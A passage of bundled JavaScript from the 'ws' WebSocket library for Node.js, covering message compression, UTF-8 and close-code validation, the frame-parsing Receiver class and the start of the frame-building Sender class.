            callback(err);
            return;
          }
          const data2 = bufferUtil.concat(
            this._inflate[kBuffers],
            this._inflate[kTotalLength]
          );
          if (this._inflate._readableState.endEmitted) {
            this._inflate.close();
            this._inflate = null;
          } else {
            this._inflate[kTotalLength] = 0;
            this._inflate[kBuffers] = [];
            if (fin && this.params[`${endpoint}_no_context_takeover`]) {
              this._inflate.reset();
            }
          }
          callback(null, data2);
        });
      }
      /**
       * Compress data.
       *
       * @param {(Buffer|String)} data Data to compress
       * @param {Boolean} fin Specifies whether or not this is the last fragment
       * @param {Function} callback Callback
       * @private
       */
      _compress(data, fin, callback) {
        const endpoint = this._isServer ? "server" : "client";
        if (!this._deflate) {
          const key = `${endpoint}_max_window_bits`;
          const windowBits = typeof this.params[key] !== "number" ? zlib.Z_DEFAULT_WINDOWBITS : this.params[key];
          this._deflate = zlib.createDeflateRaw({
            ...this._options.zlibDeflateOptions,
            windowBits
          });
          this._deflate[kTotalLength] = 0;
          this._deflate[kBuffers] = [];
          this._deflate.on("data", deflateOnData);
        }
        this._deflate[kCallback] = callback;
        this._deflate.write(data);
        this._deflate.flush(zlib.Z_SYNC_FLUSH, () => {
          if (!this._deflate) {
            return;
          }
          let data2 = bufferUtil.concat(
            this._deflate[kBuffers],
            this._deflate[kTotalLength]
          );
          if (fin) {
            data2 = new FastBuffer(data2.buffer, data2.byteOffset, data2.length - 4);
          }
          this._deflate[kCallback] = null;
          this._deflate[kTotalLength] = 0;
          this._deflate[kBuffers] = [];
          if (fin && this.params[`${endpoint}_no_context_takeover`]) {
            this._deflate.reset();
          }
          callback(null, data2);
        });
      }
    };
    module2.exports = PerMessageDeflate;
    function deflateOnData(chunk) {
      this[kBuffers].push(chunk);
      this[kTotalLength] += chunk.length;
    }
    function inflateOnData(chunk) {
      this[kTotalLength] += chunk.length;
      if (this[kPerMessageDeflate]._maxPayload < 1 || this[kTotalLength] <= this[kPerMessageDeflate]._maxPayload) {
        this[kBuffers].push(chunk);
        return;
      }
      this[kError] = new RangeError("Max payload size exceeded");
      this[kError].code = "WS_ERR_UNSUPPORTED_MESSAGE_LENGTH";
      this[kError][kStatusCode] = 1009;
      this.removeListener("data", inflateOnData);
      this.reset();
    }
    function inflateOnError(err) {
      this[kPerMessageDeflate]._inflate = null;
      if (this[kError]) {
        this[kCallback](this[kError]);
        return;
      }
      err[kStatusCode] = 1007;
      this[kCallback](err);
    }
  }
});

// node_modules/ws/lib/validation.js
var require_validation = __commonJS({
  "node_modules/ws/lib/validation.js"(exports2, module2) {
    "use strict";
    var { isUtf8 } = require("buffer");
    var { hasBlob } = require_constants();
    var tokenChars = [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      // 0 - 15
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      // 16 - 31
      0,
      1,
      0,
      1,
      1,
      1,
      1,
      1,
      0,
      0,
      1,
      1,
      0,
      1,
      1,
      0,
      // 32 - 47
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      // 48 - 63
      0,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      // 64 - 79
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      0,
      0,
      0,
      1,
      1,
      // 80 - 95
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      // 96 - 111
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      1,
      0,
      1,
      0,
      1,
      0
      // 112 - 127
    ];
    function isValidStatusCode(code2) {
      return code2 >= 1e3 && code2 <= 1014 && code2 !== 1004 && code2 !== 1005 && code2 !== 1006 || code2 >= 3e3 && code2 <= 4999;
    }
    function _isValidUTF8(buf) {
      const len = buf.length;
      let i = 0;
      while (i < len) {
        if ((buf[i] & 128) === 0) {
          i++;
        } else if ((buf[i] & 224) === 192) {
          if (i + 1 === len || (buf[i + 1] & 192) !== 128 || (buf[i] & 254) === 192) {
            return false;
          }
          i += 2;
        } else if ((buf[i] & 240) === 224) {
          if (i + 2 >= len || (buf[i + 1] & 192) !== 128 || (buf[i + 2] & 192) !== 128 || buf[i] === 224 && (buf[i + 1] & 224) === 128 || // Overlong
          buf[i] === 237 && (buf[i + 1] & 224) === 160) {
            return false;
          }
          i += 3;
        } else if ((buf[i] & 248) === 240) {
          if (i + 3 >= len || (buf[i + 1] & 192) !== 128 || (buf[i + 2] & 192) !== 128 || (buf[i + 3] & 192) !== 128 || buf[i] === 240 && (buf[i + 1] & 240) === 128 || // Overlong
          buf[i] === 244 && buf[i + 1] > 143 || buf[i] > 244) {
            return false;
          }
          i += 4;
        } else {
          return false;
        }
      }
      return true;
    }
    function isBlob(value) {
      return hasBlob && typeof value === "object" && typeof value.arrayBuffer === "function" && typeof value.type === "string" && typeof value.stream === "function" && (value[Symbol.toStringTag] === "Blob" || value[Symbol.toStringTag] === "File");
    }
    module2.exports = {
      isBlob,
      isValidStatusCode,
      isValidUTF8: _isValidUTF8,
      tokenChars
    };
    if (isUtf8) {
      module2.exports.isValidUTF8 = function(buf) {
        return buf.length < 24 ? _isValidUTF8(buf) : isUtf8(buf);
      };
    } else if (!process.env.WS_NO_UTF_8_VALIDATE) {
      try {
        const isValidUTF8 = require("utf-8-validate");
        module2.exports.isValidUTF8 = function(buf) {
          return buf.length < 32 ? _isValidUTF8(buf) : isValidUTF8(buf);
        };
      } catch (e) {
      }
    }
  }
});

// node_modules/ws/lib/receiver.js
var require_receiver = __commonJS({
  "node_modules/ws/lib/receiver.js"(exports2, module2) {
    "use strict";
    var { Writable } = require("stream");
    var PerMessageDeflate = require_permessage_deflate();
    var {
      BINARY_TYPES,
      EMPTY_BUFFER,
      kStatusCode,
      kWebSocket
    } = require_constants();
    var { concat, toArrayBuffer, unmask } = require_buffer_util();
    var { isValidStatusCode, isValidUTF8 } = require_validation();
    var FastBuffer = Buffer[Symbol.species];
    var GET_INFO = 0;
    var GET_PAYLOAD_LENGTH_16 = 1;
    var GET_PAYLOAD_LENGTH_64 = 2;
    var GET_MASK = 3;
    var GET_DATA = 4;
    var INFLATING = 5;
    var DEFER_EVENT = 6;
    var Receiver = class extends Writable {
      /**
       * Creates a Receiver instance.
       *
       * @param {Object} [options] Options object
       * @param {Boolean} [options.allowSynchronousEvents=true] Specifies whether
       *     any of the `'message'`, `'ping'`, and `'pong'` events can be emitted
       *     multiple times in the same tick
       * @param {String} [options.binaryType=nodebuffer] The type for binary data
       * @param {Object} [options.extensions] An object containing the negotiated
       *     extensions
       * @param {Boolean} [options.isServer=false] Specifies whether to operate in
       *     client or server mode
       * @param {Number} [options.maxPayload=0] The maximum allowed message length
       * @param {Boolean} [options.skipUTF8Validation=false] Specifies whether or
       *     not to skip UTF-8 validation for text and close messages
       */
      constructor(options = {}) {
        super();
        this._allowSynchronousEvents = options.allowSynchronousEvents !== void 0 ? options.allowSynchronousEvents : true;
        this._binaryType = options.binaryType || BINARY_TYPES[0];
        this._extensions = options.extensions || {};
        this._isServer = !!options.isServer;
        this._maxPayload = options.maxPayload | 0;
        this._skipUTF8Validation = !!options.skipUTF8Validation;
        this[kWebSocket] = void 0;
        this._bufferedBytes = 0;
        this._buffers = [];
        this._compressed = false;
        this._payloadLength = 0;
        this._mask = void 0;
        this._fragmented = 0;
        this._masked = false;
        this._fin = false;
        this._opcode = 0;
        this._totalPayloadLength = 0;
        this._messageLength = 0;
        this._fragments = [];
        this._errored = false;
        this._loop = false;
        this._state = GET_INFO;
      }
      /**
       * Implements `Writable.prototype._write()`.
       *
       * @param {Buffer} chunk The chunk of data to write
       * @param {String} encoding The character encoding of `chunk`
       * @param {Function} cb Callback
       * @private
       */
      _write(chunk, encoding, cb) {
        if (this._opcode === 8 && this._state == GET_INFO) return cb();
        this._bufferedBytes += chunk.length;
        this._buffers.push(chunk);
        this.startLoop(cb);
      }
      /**
       * Consumes `n` bytes from the buffered data.
       *
       * @param {Number} n The number of bytes to consume
       * @return {Buffer} The consumed bytes
       * @private
       */
      consume(n) {
        this._bufferedBytes -= n;
        if (n === this._buffers[0].length) return this._buffers.shift();
        if (n < this._buffers[0].length) {
          const buf = this._buffers[0];
          this._buffers[0] = new FastBuffer(
            buf.buffer,
            buf.byteOffset + n,
            buf.length - n
          );
          return new FastBuffer(buf.buffer, buf.byteOffset, n);
        }
        const dst = Buffer.allocUnsafe(n);
        do {
          const buf = this._buffers[0];
          const offset = dst.length - n;
          if (n >= buf.length) {
            dst.set(this._buffers.shift(), offset);
          } else {
            dst.set(new Uint8Array(buf.buffer, buf.byteOffset, n), offset);
            this._buffers[0] = new FastBuffer(
              buf.buffer,
              buf.byteOffset + n,
              buf.length - n
            );
          }
          n -= buf.length;
        } while (n > 0);
        return dst;
      }
      /**
       * Starts the parsing loop.
       *
       * @param {Function} cb Callback
       * @private
       */
      startLoop(cb) {
        this._loop = true;
        do {
          switch (this._state) {
            case GET_INFO:
              this.getInfo(cb);
              break;
            case GET_PAYLOAD_LENGTH_16:
              this.getPayloadLength16(cb);
              break;
            case GET_PAYLOAD_LENGTH_64:
              this.getPayloadLength64(cb);
              break;
            case GET_MASK:
              this.getMask();
              break;
            case GET_DATA:
              this.getData(cb);
              break;
            case INFLATING:
            case DEFER_EVENT:
              this._loop = false;
              return;
          }
        } while (this._loop);
        if (!this._errored) cb();
      }
      /**
       * Reads the first two bytes of a frame.
       *
       * @param {Function} cb Callback
       * @private
       */
      getInfo(cb) {
        if (this._bufferedBytes < 2) {
          this._loop = false;
          return;
        }
        const buf = this.consume(2);
        if ((buf[0] & 48) !== 0) {
          const error = this.createError(
            RangeError,
            "RSV2 and RSV3 must be clear",
            true,
            1002,
            "WS_ERR_UNEXPECTED_RSV_2_3"
          );
          cb(error);
          return;
        }
        const compressed = (buf[0] & 64) === 64;
        if (compressed && !this._extensions[PerMessageDeflate.extensionName]) {
          const error = this.createError(
            RangeError,
            "RSV1 must be clear",
            true,
            1002,
            "WS_ERR_UNEXPECTED_RSV_1"
          );
          cb(error);
          return;
        }
        this._fin = (buf[0] & 128) === 128;
        this._opcode = buf[0] & 15;
        this._payloadLength = buf[1] & 127;
        if (this._opcode === 0) {
          if (compressed) {
            const error = this.createError(
              RangeError,
              "RSV1 must be clear",
              true,
              1002,
              "WS_ERR_UNEXPECTED_RSV_1"
            );
            cb(error);
            return;
          }
          if (!this._fragmented) {
            const error = this.createError(
              RangeError,
              "invalid opcode 0",
              true,
              1002,
              "WS_ERR_INVALID_OPCODE"
            );
            cb(error);
            return;
          }
          this._opcode = this._fragmented;
        } else if (this._opcode === 1 || this._opcode === 2) {
          if (this._fragmented) {
            const error = this.createError(
              RangeError,
              `invalid opcode ${this._opcode}`,
              true,
              1002,
              "WS_ERR_INVALID_OPCODE"
            );
            cb(error);
            return;
          }
          this._compressed = compressed;
        } else if (this._opcode > 7 && this._opcode < 11) {
          if (!this._fin) {
            const error = this.createError(
              RangeError,
              "FIN must be set",
              true,
              1002,
              "WS_ERR_EXPECTED_FIN"
            );
            cb(error);
            return;
          }
          if (compressed) {
            const error = this.createError(
              RangeError,
              "RSV1 must be clear",
              true,
              1002,
              "WS_ERR_UNEXPECTED_RSV_1"
            );
            cb(error);
            return;
          }
          if (this._payloadLength > 125 || this._opcode === 8 && this._payloadLength === 1) {
            const error = this.createError(
              RangeError,
              `invalid payload length ${this._payloadLength}`,
              true,
              1002,
              "WS_ERR_INVALID_CONTROL_PAYLOAD_LENGTH"
            );
            cb(error);
            return;
          }
        } else {
          const error = this.createError(
            RangeError,
            `invalid opcode ${this._opcode}`,
            true,
            1002,
            "WS_ERR_INVALID_OPCODE"
          );
          cb(error);
          return;
        }
        if (!this._fin && !this._fragmented) this._fragmented = this._opcode;
        this._masked = (buf[1] & 128) === 128;
        if (this._isServer) {
          if (!this._masked) {
            const error = this.createError(
              RangeError,
              "MASK must be set",
              true,
              1002,
              "WS_ERR_EXPECTED_MASK"
            );
            cb(error);
            return;
          }
        } else if (this._masked) {
          const error = this.createError(
            RangeError,
            "MASK must be clear",
            true,
            1002,
            "WS_ERR_UNEXPECTED_MASK"
          );
          cb(error);
          return;
        }
        if (this._payloadLength === 126) this._state = GET_PAYLOAD_LENGTH_16;
        else if (this._payloadLength === 127) this._state = GET_PAYLOAD_LENGTH_64;
        else this.haveLength(cb);
      }
      /**
       * Gets extended payload length (7+16).
       *
       * @param {Function} cb Callback
       * @private
       */
      getPayloadLength16(cb) {
        if (this._bufferedBytes < 2) {
          this._loop = false;
          return;
        }
        this._payloadLength = this.consume(2).readUInt16BE(0);
        this.haveLength(cb);
      }
      /**
       * Gets extended payload length (7+64).
       *
       * @param {Function} cb Callback
       * @private
       */
      getPayloadLength64(cb) {
        if (this._bufferedBytes < 8) {
          this._loop = false;
          return;
        }
        const buf = this.consume(8);
        const num = buf.readUInt32BE(0);
        if (num > Math.pow(2, 53 - 32) - 1) {
          const error = this.createError(
            RangeError,
            "Unsupported WebSocket frame: payload length > 2^53 - 1",
            false,
            1009,
            "WS_ERR_UNSUPPORTED_DATA_PAYLOAD_LENGTH"
          );
          cb(error);
          return;
        }
        this._payloadLength = num * Math.pow(2, 32) + buf.readUInt32BE(4);
        this.haveLength(cb);
      }
      /**
       * Payload length has been read.
       *
       * @param {Function} cb Callback
       * @private
       */
      haveLength(cb) {
        if (this._payloadLength && this._opcode < 8) {
          this._totalPayloadLength += this._payloadLength;
          if (this._totalPayloadLength > this._maxPayload && this._maxPayload > 0) {
            const error = this.createError(
              RangeError,
              "Max payload size exceeded",
              false,
              1009,
              "WS_ERR_UNSUPPORTED_MESSAGE_LENGTH"
            );
            cb(error);
            return;
          }
        }
        if (this._masked) this._state = GET_MASK;
        else this._state = GET_DATA;
      }
      /**
       * Reads mask bytes.
       *
       * @private
       */
      getMask() {
        if (this._bufferedBytes < 4) {
          this._loop = false;
          return;
        }
        this._mask = this.consume(4);
        this._state = GET_DATA;
      }
      /**
       * Reads data bytes.
       *
       * @param {Function} cb Callback
       * @private
       */
      getData(cb) {
        let data = EMPTY_BUFFER;
        if (this._payloadLength) {
          if (this._bufferedBytes < this._payloadLength) {
            this._loop = false;
            return;
          }
          data = this.consume(this._payloadLength);
          if (this._masked && (this._mask[0] | this._mask[1] | this._mask[2] | this._mask[3]) !== 0) {
            unmask(data, this._mask);
          }
        }
        if (this._opcode > 7) {
          this.controlMessage(data, cb);
          return;
        }
        if (this._compressed) {
          this._state = INFLATING;
          this.decompress(data, cb);
          return;
        }
        if (data.length) {
          this._messageLength = this._totalPayloadLength;
          this._fragments.push(data);
        }
        this.dataMessage(cb);
      }
      /**
       * Decompresses data.
       *
       * @param {Buffer} data Compressed data
       * @param {Function} cb Callback
       * @private
       */
      decompress(data, cb) {
        const perMessageDeflate = this._extensions[PerMessageDeflate.extensionName];
        perMessageDeflate.decompress(data, this._fin, (err, buf) => {
          if (err) return cb(err);
          if (buf.length) {
            this._messageLength += buf.length;
            if (this._messageLength > this._maxPayload && this._maxPayload > 0) {
              const error = this.createError(
                RangeError,
                "Max payload size exceeded",
                false,
                1009,
                "WS_ERR_UNSUPPORTED_MESSAGE_LENGTH"
              );
              cb(error);
              return;
            }
            this._fragments.push(buf);
          }
          this.dataMessage(cb);
          if (this._state === GET_INFO) this.startLoop(cb);
        });
      }
      /**
       * Handles a data message.
       *
       * @param {Function} cb Callback
       * @private
       */
      dataMessage(cb) {
        if (!this._fin) {
          this._state = GET_INFO;
          return;
        }
        const messageLength = this._messageLength;
        const fragments = this._fragments;
        this._totalPayloadLength = 0;
        this._messageLength = 0;
        this._fragmented = 0;
        this._fragments = [];
        if (this._opcode === 2) {
          let data;
          if (this._binaryType === "nodebuffer") {
            data = concat(fragments, messageLength);
          } else if (this._binaryType === "arraybuffer") {
            data = toArrayBuffer(concat(fragments, messageLength));
          } else if (this._binaryType === "blob") {
            data = new Blob(fragments);
          } else {
            data = fragments;
          }
          if (this._allowSynchronousEvents) {
            this.emit("message", data, true);
            this._state = GET_INFO;
          } else {
            this._state = DEFER_EVENT;
            setImmediate(() => {
              this.emit("message", data, true);
              this._state = GET_INFO;
              this.startLoop(cb);
            });
          }
        } else {
          const buf = concat(fragments, messageLength);
          if (!this._skipUTF8Validation && !isValidUTF8(buf)) {
            const error = this.createError(
              Error,
              "invalid UTF-8 sequence",
              true,
              1007,
              "WS_ERR_INVALID_UTF8"
            );
            cb(error);
            return;
          }
          if (this._state === INFLATING || this._allowSynchronousEvents) {
            this.emit("message", buf, false);
            this._state = GET_INFO;
          } else {
            this._state = DEFER_EVENT;
            setImmediate(() => {
              this.emit("message", buf, false);
              this._state = GET_INFO;
              this.startLoop(cb);
            });
          }
        }
      }
      /**
       * Handles a control message.
       *
       * @param {Buffer} data Data to handle
       * @return {(Error|RangeError|undefined)} A possible error
       * @private
       */
      controlMessage(data, cb) {
        if (this._opcode === 8) {
          if (data.length === 0) {
            this._loop = false;
            this.emit("conclude", 1005, EMPTY_BUFFER);
            this.end();
          } else {
            const code2 = data.readUInt16BE(0);
            if (!isValidStatusCode(code2)) {
              const error = this.createError(
                RangeError,
                `invalid status code ${code2}`,
                true,
                1002,
                "WS_ERR_INVALID_CLOSE_CODE"
              );
              cb(error);
              return;
            }
            const buf = new FastBuffer(
              data.buffer,
              data.byteOffset + 2,
              data.length - 2
            );
            if (!this._skipUTF8Validation && !isValidUTF8(buf)) {
              const error = this.createError(
                Error,
                "invalid UTF-8 sequence",
                true,
                1007,
                "WS_ERR_INVALID_UTF8"
              );
              cb(error);
              return;
            }
            this._loop = false;
            this.emit("conclude", code2, buf);
            this.end();
          }
          this._state = GET_INFO;
          return;
        }
        if (this._allowSynchronousEvents) {
          this.emit(this._opcode === 9 ? "ping" : "pong", data);
          this._state = GET_INFO;
        } else {
          this._state = DEFER_EVENT;
          setImmediate(() => {
            this.emit(this._opcode === 9 ? "ping" : "pong", data);
            this._state = GET_INFO;
            this.startLoop(cb);
          });
        }
      }
      /**
       * Builds an error object.
       *
       * @param {function(new:Error|RangeError)} ErrorCtor The error constructor
       * @param {String} message The error message
       * @param {Boolean} prefix Specifies whether or not to add a default prefix to
       *     `message`
       * @param {Number} statusCode The status code
       * @param {String} errorCode The exposed error code
       * @return {(Error|RangeError)} The error
       * @private
       */
      createError(ErrorCtor, message, prefix, statusCode, errorCode) {
        this._loop = false;
        this._errored = true;
        const err = new ErrorCtor(
          prefix ? `Invalid WebSocket frame: ${message}` : message
        );
        Error.captureStackTrace(err, this.createError);
        err.code = errorCode;
        err[kStatusCode] = statusCode;
        return err;
      }
    };
    module2.exports = Receiver;
  }
});

// node_modules/ws/lib/sender.js
var require_sender = __commonJS({
  "node_modules/ws/lib/sender.js"(exports2, module2) {
    "use strict";
    var { Duplex } = require("stream");
    var { randomFillSync } = require("crypto");
    var PerMessageDeflate = require_permessage_deflate();
    var { EMPTY_BUFFER, kWebSocket, NOOP } = require_constants();
    var { isBlob, isValidStatusCode } = require_validation();
    var { mask: applyMask, toBuffer } = require_buffer_util();
    var kByteLength = /* @__PURE__ */ Symbol("kByteLength");
    var maskBuffer = Buffer.alloc(4);
    var RANDOM_POOL_SIZE = 8 * 1024;
    var randomPool;
    var randomPoolPointer = RANDOM_POOL_SIZE;
    var DEFAULT = 0;
    var DEFLATING = 1;
    var GET_BLOB_DATA = 2;
    var Sender = class _Sender {
      /**
       * Creates a Sender instance.
       *
       * @param {Duplex} socket The connection socket
       * @param {Object} [extensions] An object containing the negotiated extensions
       * @param {Function} [generateMask] The function used to generate the masking
       *     key
       */
      constructor(socket, extensions, generateMask) {
        this._extensions = extensions || {};
        if (generateMask) {
          this._generateMask = generateMask;
          this._maskBuffer = Buffer.alloc(4);
        }
        this._socket = socket;
        this._firstFragment = true;
        this._compress = false;
        this._bufferedBytes = 0;
        this._queue = [];
        this._state = DEFAULT;
        this.onerror = NOOP;
        this[kWebSocket] = void 0;
      }
      /**
       * Frames a piece of data according to the HyBi WebSocket protocol.
       *
       * @param {(Buffer|String)} data The data to frame
       * @param {Object} options Options object
       * @param {Boolean} [options.fin=false] Specifies whether or not to set the
       *     FIN bit
       * @param {Function} [options.generateMask] The function used to generate the
       *     masking key
       * @param {Boolean} [options.mask=false] Specifies whether or not to mask
       *     `data`
       * @param {Buffer} [options.maskBuffer] The buffer used to store the masking
       *     key
       * @param {Number} options.opcode The opcode
       * @param {Boolean} [options.readOnly=false] Specifies whether `data` can be
       *     modified
       * @param {Boolean} [options.rsv1=false] Specifies whether or not to set the
       *     RSV1 bit
       * @return {(Buffer|String)[]} The framed data
       * @public
       */
      static frame(data, options) {
        let mask;
        let merge = false;
        let offset = 2;
        let skipMasking = false;
        if (options.mask) {
          mask = options.maskBuffer || maskBuffer;
          if (options.generateMask) {
            options.generateMask(mask);
          } else {
            if (randomPoolPointer === RANDOM_POOL_SIZE) {
              if (randomPool === void 0) {
                randomPool = Buffer.alloc(RANDOM_POOL_SIZE);
              }
              randomFillSync(randomPool, 0, RANDOM_POOL_SIZE);
              randomPoolPointer = 0;
            }
            mask[0] = randomPool[randomPoolPointer++];
            mask[1] = randomPool[randomPoolPointer++];
            mask[2] = randomPool[randomPoolPointer++];
            mask[3] = randomPool[randomPoolPointer++];
          }
          skipMasking = (mask[0] | mask[1] | mask[2] | mask[3]) === 0;
          offset = 6;
        }
        let dataLength;
        if (typeof data === "string") {
          if ((!options.mask || skipMasking) && options[kByteLength] !== void 0) {
            dataLength = options[kByteLength];
          } else {
            data = Buffer.from(data);
            dataLength = data.length;
          }
        } else {
          dataLength = data.length;
          merge = options.mask && options.readOnly && !skipMasking;
        }
        let payloadLength = dataLength;
        if (dataLength >= 65536) {
          offset += 8;
          payloadLength = 127;
        } else if (dataLength > 125) {
          offset += 2;
          payloadLength = 126;
        }
        const target = Buffer.allocUnsafe(merge ? dataLength + offset : offset);
        target[0] = options.fin ? options.opcode | 128 : options.opcode;
        if (options.rsv1) target[0] |= 64;
        target[1] = payloadLength;
        if (payloadLength === 126) {
          target.writeUInt16BE(dataLength, 2);
        } else if (payloadLength === 127) {
          target[2] = target[3] = 0;
          target.writeUIntBE(dataLength, 4, 6);
        }
        if (!options.mask) return [target, data];
        target[1] |= 128;
        target[offset - 4] = mask[0];
        target[offset - 3] = mask[1];
        target[offset - 2] = mask[2];
        target[offset - 1] = mask[3];
        if (skipMasking) return [target, data];
        if (merge) {
          applyMask(data, mask, target, offset, dataLength);
          return [target];
        }
        applyMask(data, mask, data, 0, dataLength);
        return [target, data];
      }
      /**
       * Sends a close message to the other peer.
       *
       * @param {Number} [code] The status code component of the body
       * @param {(String|Buffer)} [data] The message component of the body
       * @param {Boolean} [mask=false] Specifies whether or not to mask the message
       * @param {Function} [cb] Callback
       * @public
       */
      close(code2, data, mask, cb) {
        let buf;
        if (code2 === void 0) {
          buf = EMPTY_BUFFER;
        } else if (typeof code2 !== "number" || !isValidStatusCode(code2)) {
          throw new TypeError("First argument must be a valid error code number");
        } else if (data === void 0 || !data.length) {
          buf = Buffer.allocUnsafe(2);
          buf.writeUInt16BE(code2, 0);
        } else {
          const length = Buffer.byteLength(data);
          if (length > 123) {
            throw new RangeError("The message must not be greater than 123 bytes");
          }
          buf = Buffer.allocUnsafe(2 + length);
          buf.writeUInt16BE(code2, 0);
          if (typeof data === "string") {
            buf.write(data, 2);
          } else {
            buf.set(data, 2);
          }
        }
        const options = {
          [kByteLength]: buf.length,
          fin: true,
          generateMask: this._generateMask,
          mask,
          maskBuffer: this._maskBuffer,
          opcode: 8,
          readOnly: false,
          rsv1: false
        };
        if (this._state !== DEFAULT) {
          this.enqueue([this.dispatch, buf, false, options, cb]);
        } else {
          this.sendFrame(_Sender.frame(buf, options), cb);
        }
      }
      /**
       * Sends a ping message to the other peer.
       *
       * @param {*} data The message to send
       * @param {Boolean} [mask=false] Specifies whether or not to mask `data`
       * @param {Function} [cb] Callback
       * @public
       */
      ping(data, mask, cb) {
        let byteLength;
        let readOnly;
        if (typeof data === "string") {
          byteLength = Buffer.byteLength(data);
          readOnly = false;
        } else if (isBlob(data)) {
          byteLength = data.size;
          readOnly = false;
        } else {
          data = toBuffer(data);
          byteLength = data.length;
          readOnly = toBuffer.readOnly;
        }
        if (byteLength > 125) {
          throw new RangeError("The data size must not be greater than 125 bytes");
        }
        const options = {
          [kByteLength]: byteLength,
          fin: true,
          generateMask: this._generateMask,
          mask,
          maskBuffer: this._maskBuffer,
          opcode: 9,
          readOnly,
          rsv1: false
        };
        if (isBlob(data)) {
          if (this._state !== DEFAULT) {
            this.enqueue([this.getBlobData, data, false, options, cb]);
          } else {
            this.getBlobData(data, false, options, cb);
          }
        } else if (this._state !== DEFAULT) {
          this.enqueue([this.dispatch, data, false, options, cb]);
        } else {
          this.sendFrame(_Sender.frame(data, options), cb);
        }
      }
      /**
       * Sends a pong message to the other peer.
       *
       * @param {*} data The message to send
       * @param {Boolean} [mask=false] Specifies whether or not to mask `data`
       * @param {Function} [cb] Callback
       * @public
       */
      pong(data, mask, cb) {
        let byteLength;
        let readOnly;
        if (typeof data === "string") {
          byteLength = Buffer.byteLength(data);
          readOnly = false;
        } else if (isBlob(data)) {
          byteLength = data.size;
          readOnly = false;
        } else {
          data = toBuffer(data);
          byteLength = data.length;
          readOnly = toBuffer.readOnly;
        }
        if (byteLength > 125) {
          throw new RangeError("The data size must not be greater than 125 bytes");
        }
        const options = {
          [kByteLength]: byteLength,
          fin: true,
          generateMask: this._generateMask,
          mask,
          maskBuffer: this._maskBuffer,
          opcode: 10,
          readOnly,
          rsv1: false
        };
        if (isBlob(data)) {
          if (this._state !== DEFAULT) {
            this.enqueue([this.getBlobData, data, false, options, cb]);
          } else {
            this.getBlobData(data, false, options, cb);
          }
        } else if (this._state !== DEFAULT) {
          this.enqueue([this.dispatch, data, false, options, cb]);
        } else {
          this.sendFrame(_Sender.frame(data, options), cb);
        }
      }
      /**
       * Sends a data message to the other peer.
       *
       * @param {*} data The message to send
       * @param {Object} options Options object
       * @param {Boolean} [options.binary=false] Specifies whether `data` is binary
       *     or text
       * @param {Boolean} [options.compress=false] Specifies whether or not to
       *     compress `data`
       * @param {Boolean} [options.fin=false] Specifies whether the fragment is the
       *     last one
       * @param {Boolean} [options.mask=false] Specifies whether or not to mask
       *     `data`
       * @param {Function} [cb] Callback
       * @public
       */
      send(data, options, cb) {
        const perMessageDeflate = this._extensions[PerMessageDeflate.extensionName];
        let opcode = options.binary ? 2 : 1;
        let rsv1 = options.compress;
        let byteLength;
        let readOnly;
        if (typeof data === "string") {
          byteLength = Buffer.byteLength(data);
          readOnly = false;
        } else if (isBlob(data)) {
          byteLength = data.size;
          readOnly = false;
        } else {
          data = toBuffer(data);
          byteLength = data.length;
          readOnly = toBuffer.readOnly;
        }
        if (this._firstFragment) {
          this._firstFragment = false;
          if (rsv1 && perMessageDeflate && perMessageDeflate.params[perMessageDeflate._isServer ? "server_no_context_takeover" : "client_no_context_takeover"]) {
            rsv1 = byteLength >= perMessageDeflate._threshold;
          }
          this._compress = rsv1;
        } else {
          rsv1 = false;
          opcode = 0;
        }
        if (options.fin) this._firstFragment = true;
        const opts = {
          [kByteLength]: byteLength,
          fin: options.fin,
          generateMask: this._generateMask,
          mask: options.mask,
          maskBuffer: this._maskBuffer,
          opcode,
          readOnly,
          rsv1
        };
        if (isBlob(data)) {
          if (this._state !== DEFAULT) {
            this.enqueue([this.getBlobData, data, this._compress, opts, cb]);
          } else {
            this.getBlobData(data, this._compress, opts, cb);
          }
        } else if (this._state !== DEFAULT) {
          this.enqueue([this.dispatch, data, this._compress, opts, cb]);
        } else {
          this.dispatch(data, this._compress, opts, cb);
        }
      }
      /**
       * Gets the contents of a blob as binary data.
       *
       * @param {Blob} blob The blob
       * @param {Boolean} [compress=false] Specifies whether or not to compress
       *     the data
       * @param {Object} options Options object
       * @param {Boolean} [options.fin=false] Specifies whether or not to set the
       *     FIN bit
       * @param {Function} [options.generateMask] The function used to generate the
       *     masking key
       * @param {Boolean} [options.mask=false] Specifies whether or not to mask
       *     `data`
       * @param {Buffer} [options.maskBuffer] The buffer used to store the masking
       *     key
       * @param {Number} options.opcode The opcode
       * @param {Boolean} [options.readOnly=false] Specifies whether `data` can be
       *     modified
       * @param {Boolean} [options.rsv1=false] Specifies whether or not to set the
       *     RSV1 bit
       * @param {Function} [cb] Callback
       * @private
       */
      getBlobData(blob, compress, options, cb) {
        this._bufferedBytes += options[kByteLength];
        this._state = GET_BLOB_DATA;
        blob.arrayBuffer().then((arrayBuffer) => {
          if (this._socket.destroyed) {
            const err = new Error(
              "The socket was closed while the blob was being read"
            );
            process.nextTick(callCallbacks, this, err, cb);
            return;
          }
          this._bufferedBytes -= options[kByteLength];
          const data = toBuffer(arrayBuffer);
          if (!compress) {
            this._state = DEFAULT;
            this.sendFrame(_Sender.frame(data, options), cb);
            this.dequeue();
          } else {
            this.dispatch(data, compress, options, cb);
          }
        }).catch((err) => {
          process.nextTick(onError, this, err, cb);
        });
      }
      /**
       * Dispatches a message.
       *
       * @param {(Buffer|String)} data The message to send
       * @param {Boolean} [compress=false] Specifies whether or not to compress
       *     `data`
       * @param {Object} options Options object
       * @param {Boolean} [options.fin=false] Specifies whether or not to set the
       *     FIN bit
       * @param {Function} [options.generateMask] The function used to generate the
       *     masking key
       * @param {Boolean} [options.mask=false] Specifies whether or not to mask
       *     `data`
       * @param {Buffer} [options.maskBuffer] The buffer used to store the masking
       *     key
       * @param {Number} options.opcode The opcode
